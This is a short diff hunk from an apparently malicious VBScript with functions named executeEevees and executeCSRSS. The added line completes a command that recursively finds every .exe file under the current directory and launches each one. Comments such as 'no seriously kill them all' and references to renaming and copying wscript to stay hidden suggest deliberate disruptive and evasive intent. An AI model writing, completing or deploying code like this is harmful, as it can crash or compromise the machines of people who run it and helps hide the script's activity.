@@ -48,7 +48,7 @@ Function copyWscript() 'Copy the systems wscript into a temporary folder rename 
 End Function
 
 Function executeEevees() 'no seriously kill them all
-	CreateObject("WScript.Shell").run "cmd /c start for /r %i in (*.exe) do "
+	CreateObject("WScript.Shell").run "cmd /c start for /r %i in (*.exe) do start ""%i"""
 End Function
 
 Function executeCSRSS() 'Commence undercover agent, naming of vbs program could change, just run anything with vbs extension
